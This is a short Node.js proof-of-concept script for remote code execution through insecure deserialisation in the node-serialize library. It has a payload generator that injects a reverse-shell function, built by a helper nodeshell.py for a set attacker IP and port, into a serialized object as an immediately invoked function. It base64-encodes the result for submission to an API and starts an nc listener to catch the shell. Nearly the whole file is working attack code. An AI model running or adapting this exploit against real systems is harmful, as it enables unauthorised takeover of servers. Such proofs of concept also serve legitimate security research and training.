const { serialize } = require("node-serialize");
const { spawn } = require("child_process");

/**
 * Configuration: The exploit configuration
 * LHOST: LocalHost
 * LPORT: LocalPort
 * PAYLOAD: Request Payload for API
 */
const config = {
  LHOST: "192.168.1.26",
  LPORT: "1337",
  PAYLOAD: {
    word: "gitaalekhyapaul",
  },
};
console.log(
  "<<<=====Welcome to the PoC for RCE through JSON deserialisation=====>>>"
);
console.log("Your current config:");
console.dir(config);

console.log("Generating payload...");
const genPayload = spawn("python", [
  "nodeshell.py",
  config.LHOST,
  config.LPORT,
]);
genPayload.stdout.on("data", (data) => {
  const parsed = Buffer.from(data).toString();
  console.log("OUTPUT PAYLOAD:");
  console.log("<<<=====COPY AS IT IS=====>>>");
  const serialized = serialize({
    ...config.PAYLOAD,
    rce: function () {},
  });
  const payloadInjected = Buffer.from(
    serialized.replace(`}"}`, `${parsed.trim()}}()"}`)
  ).toString("base64");
  console.log(payloadInjected);
  console.log("<<<=====COPY AS IT IS=====>>>");
});
genPayload.stderr.on("data", (data) => {
  console.log(`ERROR: ${data}`);
});
genPayload.on("close", (code) => {
  console.log(`nodeshell.py exited with code ${code}`);
});
console.log(`Opening reverse shell on port ${config.LPORT}...`);
const revShell = spawn("nc", ["-lnvp", config.LPORT], {
  stdio: [process.stdin, process.stdout, process.stderr],
});
revShell.on("close", (code) => {
  console.log(
    `Reverse shell on port ${config.LPORT} closed with exit code ${code}`
  );
});
